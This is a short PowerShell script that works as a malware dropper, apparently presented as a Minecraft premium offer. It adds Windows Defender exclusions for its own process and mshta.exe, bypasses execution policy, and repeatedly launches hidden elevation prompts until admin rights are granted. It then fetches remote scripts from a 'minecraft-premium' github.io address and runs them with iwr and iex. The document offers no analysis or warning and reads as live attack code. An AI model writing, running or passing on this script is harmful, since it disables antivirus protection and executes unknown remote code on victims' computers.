invoke-expression "`$ExecutionContext.SessionState.LanguageMode='FullLanguage'" Set-ExecutionPolicy Bypass -Scope Process Write-Host "add windows defender exclusion." -ForegroundColor Green Add-MpPreference -ExclusionPath (Get-Process -Id $PID).Path $name = Get-Process -Id $pid | Select-Object -ExpandProperty Name Add-MpPreference -ExclusionProcess ($name + ".exe") Add-MpPreference -ExclusionProcess "mshta.exe" if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ while($true){ try{ Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://minecraft-premium.github.io/url.ps1 -UseBasicParsing)" exit }catch{} } } $ProgressPreference = 'SilentlyContinue' [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 iwr "https://minecraft-premium.github.io/nah.ps1" -UseBasicParsing | iex
